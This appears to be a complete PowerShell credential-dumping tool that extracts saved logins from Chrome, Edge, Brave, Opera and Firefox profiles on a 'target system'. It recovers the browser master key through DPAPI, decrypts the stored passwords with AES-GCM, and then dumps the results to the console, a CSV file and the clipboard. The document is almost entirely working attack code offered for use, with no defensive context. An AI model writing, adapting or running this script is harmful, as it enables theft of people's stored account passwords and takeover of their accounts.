# Browser Password Decryption Script
# This script decrypts saved passwords from Chrome, Edge, Firefox, and other browsers
# Requires execution on the target system with the same user account that saved the passwords

Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Windows.Forms

# Function to decrypt DPAPI encrypted data
function Unprotect-Data {
    param(
        [byte[]]$EncryptedData
    )
    
    try {
        return [System.Security.Cryptography.ProtectedData]::Unprotect(
            $EncryptedData, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
    } catch {
        Write-Host "DPAPI decryption failed: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# Function to extract and decrypt Chrome/Edge/Brave passwords
function Get-DecryptedBrowserPasswords {
    param(
        [string]$BrowserName,
        [string]$BrowserDataPath
    )
    
    $results = @()
    
    if (-not (Test-Path $BrowserDataPath)) {
        Write-Host "$BrowserName data directory not found: $BrowserDataPath" -ForegroundColor Yellow
        return $results
    }
    
    # Get master key from Local State
    $localStatePath = Join-Path $BrowserDataPath "Local State"
    if (Test-Path $localStatePath) {
        try {
            $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
            $encryptedKey = $localState.os_crypt.encrypted_key
            
            if ($encryptedKey) {
                $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)
                # Remove the DPAPI prefix (first 5 bytes: "DPAPI")
                $encryptedKeyBytesWithoutPrefix = $encryptedKeyBytes[5..($encryptedKeyBytes.Length-1)]
                
                # Decrypt the master key using DPAPI
                $masterKey = Unprotect-Data -EncryptedData $encryptedKeyBytesWithoutPrefix
                
                if ($masterKey) {
                    Write-Host "Successfully extracted $BrowserName master key" -ForegroundColor Green
                }
            }
        } catch {
            Write-Host "Error extracting $BrowserName master key: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    # Find all login data files
    $loginDataFiles = @()
    $defaultLoginData = Join-Path $BrowserDataPath "Default\Login Data"
    if (Test-Path $defaultLoginData) {
        $loginDataFiles += @{Path = $defaultLoginData; Profile = "Default"}
    }
    
    # Check other profiles
    $profileDirs = Get-ChildItem -Path $BrowserDataPath -Directory -ErrorAction SilentlyContinue | 
                   Where-Object {$_.Name -match "^(Profile|Default|Guest).*"}
    
    foreach ($profileDir in $profileDirs) {
        $loginDataPath = Join-Path $profileDir.FullName "Login Data"
        if (Test-Path $loginDataPath) {
            $loginDataFiles += @{Path = $loginDataPath; Profile = $profileDir.Name}
        }
    }
    
    # Process each login data file
    foreach ($loginDataFile in $loginDataFiles) {
        try {
            # Copy the database to avoid locking issues
            $tempDbPath = [System.IO.Path]::GetTempFileName()
            Copy-Item $loginDataFile.Path $tempDbPath -Force
            
            # Query the database
            $connectionString = "Data Source=$tempDbPath;"
            $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
            $connection.Open()
            
            $query = "SELECT origin_url, username_value, password_value FROM logins;"
            $command = $connection.CreateCommand()
            $command.CommandText = $query
            
            $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter($command)
            $dataSet = New-Object System.Data.DataSet
            $adapter.Fill($dataSet) | Out-Null
            
            if ($dataSet.Tables[0].Rows.Count -gt 0) {
                Write-Host "Found $($dataSet.Tables[0].Rows.Count) login entries in $($loginDataFile.Profile) profile" -ForegroundColor Green
                
                foreach ($row in $dataSet.Tables[0].Rows) {
                    $url = $row["origin_url"]
                    $username = $row["username_value"]
                    $encryptedPassword = $row["password_value"]
                    
                    if ($encryptedPassword -is [byte[]] -and $encryptedPassword.Length -gt 0) {
                        $password = Decrypt-Password -EncryptedPassword $encryptedPassword -MasterKey $masterKey -BrowserName $BrowserName
                        
                        if ($password) {
                            $results += [PSCustomObject]@{
                                Browser = $BrowserName
                                Profile = $loginDataFile.Profile
                                URL = $url
                                Username = $username
                                Password = $password
                                ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                            }
                        }
                    }
                }
            }
            
            $connection.Close()
            Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
            
        } catch {
            Write-Host "Error processing $BrowserName profile $($loginDataFile.Profile): $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    return $results
}

# Function to decrypt password based on encryption method
function Decrypt-Password {
    param(
        [byte[]]$EncryptedPassword,
        [byte[]]$MasterKey,
        [string]$BrowserName
    )
    
    try {
        # Check if it's DPAPI encrypted (starts with v10, v11, etc.)
        if ($EncryptedPassword.Length -gt 3) {
            $prefix = [System.Text.Encoding]::UTF8.GetString($EncryptedPassword[0..2])
            
            if ($prefix -eq "v10" -or $prefix -eq "v11") {
                # Chrome/Edge style encryption (AES-256-GCM)
                if ($MasterKey -and $MasterKey.Length -gt 0) {
                    return Decrypt-AES256GCM -EncryptedData $EncryptedPassword -Key $MasterKey
                } else {
                    Write-Host "No master key available for $BrowserName decryption" -ForegroundColor Yellow
                    return "ENCRYPTED (Master key missing)"
                }
            } else {
                # Likely DPAPI encrypted (older Chrome versions)
                try {
                    $decryptedBytes = Unprotect-Data -EncryptedData $EncryptedPassword
                    if ($decryptedBytes) {
                        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                    }
                } catch {
                    Write-Host "DPAPI decryption failed for $BrowserName password" -ForegroundColor Red
                }
            }
        }
    } catch {
        Write-Host "Password decryption error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return "DECRYPTION_FAILED"
}

# Function to decrypt AES-256-GCM encrypted data (Chrome v80+)
function Decrypt-AES256GCM {
    param(
        [byte[]]$EncryptedData,
        [byte[]]$Key
    )
    
    try {
        # Extract components from encrypted data
        # Format: v10|iv (12 bytes)|ciphertext|tag (16 bytes)
        $iv = $EncryptedData[3..14]  # 12-byte IV after "v10" prefix
        $ciphertext = $EncryptedData[15..($EncryptedData.Length-17)]  # Everything between IV and tag
        $tag = $EncryptedData[($EncryptedData.Length-16)..($EncryptedData.Length-1)]  # Last 16 bytes are tag
        
        # Create AES-GCM decryptor
        $aes = New-Object System.Security.Cryptography.AesGcm $Key
        $plaintext = New-Object byte[] $ciphertext.Length
        
        $aes.Decrypt($iv, $ciphertext, $tag, $plaintext)
        
        return [System.Text.Encoding]::UTF8.GetString($plaintext)
    } catch {
        Write-Host "AES-GCM decryption failed: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# Function to extract Firefox passwords
function Get-FirefoxPasswords {
    $results = @()
    $firefoxProfiles = Join-Path $env:APPDATA "Mozilla\Firefox\Profiles"
    
    if (-not (Test-Path $firefoxProfiles)) {
        Write-Host "Firefox profiles directory not found" -ForegroundColor Yellow
        return $results
    }
    
    $profileDirs = Get-ChildItem -Path $firefoxProfiles -Directory | Where-Object {$_.Name -match "\.default(-release)?$"}
    
    foreach ($profileDir in $profileDirs) {
        $loginsJson = Join-Path $profileDir.FullName "logins.json"
        $key4Db = Join-Path $profileDir.FullName "key4.db"
        $cert9Db = Join-Path $profileDir.FullName "cert9.db"
        
        if (Test-Path $loginsJson) {
            try {
                $loginsData = Get-Content $loginsJson -Raw | ConvertFrom-Json
                
                foreach ($login in $loginsData.logins) {
                    # Firefox uses its own encryption, which is more complex to decrypt
                    # This would require additional libraries and processing
                    $results += [PSCustomObject]@{
                        Browser = "Firefox"
                        Profile = $profileDir.Name
                        URL = $login.hostname
                        Username = $login.username
                        Password = "Firefox decryption requires additional components"
                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    }
                }
            } catch {
                Write-Host "Error reading Firefox logins: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }
    
    return $results
}

# Main execution
Write-Host "Browser Password Decryption Tool" -ForegroundColor Green
Write-Host "=================================" -ForegroundColor Green

# Check if running with appropriate privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Warning: Not running as administrator. Some operations might fail." -ForegroundColor Yellow
}

# Extract passwords from various browsers
$allPasswords = @()

# Chrome
Write-Host "`nExtracting Chrome passwords..." -ForegroundColor Yellow
$chromePasswords = Get-DecryptedBrowserPasswords -BrowserName "Chrome" -BrowserDataPath "$env:LOCALAPPDATA\Google\Chrome\User Data"
$allPasswords += $chromePasswords

# Microsoft Edge
Write-Host "`nExtracting Microsoft Edge passwords..." -ForegroundColor Yellow
$edgePasswords = Get-DecryptedBrowserPasswords -BrowserName "Edge" -BrowserDataPath "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$allPasswords += $edgePasswords

# Brave Browser
Write-Host "`nExtracting Brave passwords..." -ForegroundColor Yellow
$bravePasswords = Get-DecryptedBrowserPasswords -BrowserName "Brave" -BrowserDataPath "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
$allPasswords += $bravePasswords

# Opera
Write-Host "`nExtracting Opera passwords..." -ForegroundColor Yellow
$operaPasswords = Get-DecryptedBrowserPasswords -BrowserName "Opera" -BrowserDataPath "$env:APPDATA\Opera Software\Opera Stable"
$allPasswords += $operaPasswords

# Firefox
Write-Host "`nExtracting Firefox passwords..." -ForegroundColor Yellow
$firefoxPasswords = Get-FirefoxPasswords
$allPasswords += $firefoxPasswords

# Display results
if ($allPasswords.Count -gt 0) {
    Write-Host "`nSuccessfully decrypted $($allPasswords.Count) passwords!" -ForegroundColor Green
    
    # Display in a table format
    $allPasswords | Format-Table -Property Browser, URL, Username, Password -AutoSize
    
    # Export to CSV
    $csvPath = Join-Path $PWD "Decrypted_Passwords_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"
    $allPasswords | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8
    Write-Host "`nPasswords exported to: $csvPath" -ForegroundColor Green
    
    # Copy to clipboard
    $clipboardText = $allPasswords | ForEach-Object {
        "URL: $($_.URL)`r`nUsername: $($_.Username)`r`nPassword: $($_.Password)`r`nBrowser: $($_.Browser)`r`n"
    } -join "`r`n" + "`r`n"
    
    Set-Clipboard -Value $clipboardText
    Write-Host "Passwords copied to clipboard!" -ForegroundColor Green
    
} else {
    Write-Host "No passwords found or decryption failed." -ForegroundColor Red
}

Write-Host "`nDecryption process completed." -ForegroundColor Green
